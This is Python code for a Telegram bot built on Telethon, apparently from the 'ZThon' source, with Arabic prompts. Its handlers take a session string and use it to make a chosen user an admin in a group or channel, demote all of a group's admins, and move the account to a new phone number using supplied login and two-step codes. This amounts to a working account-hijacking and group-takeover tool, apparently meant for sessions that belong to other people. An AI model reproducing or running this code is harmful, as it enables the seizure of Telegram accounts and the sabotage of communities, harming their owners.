@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"KKK")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      await x.send_message("**- حسنـاً .. ارسـل معـرف المجموعـة او القنـاة الآن**")
      grp = await x.get_response()
      await x.send_message("**- حسنـاً .. ارسـل المعـرف الآن**")
      user = await x.get_response()
      i = await promote(string, grp.text, user.text)
      await event.reply("**- جـارِ رفعـك مشـرفاً في المجمـوعـة/القنـاة**", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"LLL")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      await x.send_message("**- حسنـاً .. ارسـل معـرف المجموعـة او القنـاة الآن**")
      pro = await x.get_response()
      try:
        i = await demall(string, pro.text)
      except:
        pass
      await event.reply("**- تم تنزيـل مشـرفيـن المجمـوعـة/القنـاة .. بنجـاح \n- شكـراً لـ استخدامـك ســورس زدثــون**", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"MMM")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      await x.send_message("**- حسنـاً .. ارسـل الرقم الذي تريـد تغييـر الحسـاب اليـه**\n[**ملاحظـه هامـه**]\n**- اذا استخدمت الارقام الوهميه لن تستطيـع الحصـول على الكـود **")
      number = (await x.get_response()).text
      try:
        result = await change_number(string, number)
        await event.respond(result + "\n\n **انسخ كـود رمز الهاتف وتحقق من رقمك الذي حصلت عليهotp**\n**توقف لمدة 20 ثانية ثـم انسخ رمز الهاتف الكـود و otp**")
        await asyncio.sleep(20)
        await x.send_message("**- حسنـاً .. ارسـل كـود الدخـول الآن**")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("**- حسنـاً .. ارسـل كـود التحقق بخطـوتين الآن**")
        otp = (await x.get_response()).text
        changing = await change_number_code(string, number, phone_code_hash, otp)
        if changing:
          await event.respond("**- تم تغييـر الرقـم .. بنجـاح**✅")
        else:
          await event.respond("**هناك شي خطا**")
      except Exception as e:
        await event.respond(f"**- ارسل هذا الخطأ الى @zzzzl1l \n- الخطـأ** str(e)\n")
